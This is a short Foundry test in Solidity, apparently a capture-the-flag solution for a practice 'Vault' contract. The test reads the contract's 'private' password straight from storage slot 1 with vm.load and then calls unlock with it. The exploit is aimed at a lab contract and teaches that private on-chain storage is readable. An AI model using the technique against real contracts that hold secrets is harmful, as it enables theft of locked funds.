// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultTest is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault("0x01");
    }

    function testAttack() public {
        bytes32 pass = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(pass);
        assertFalse(vault.locked());
    }
}
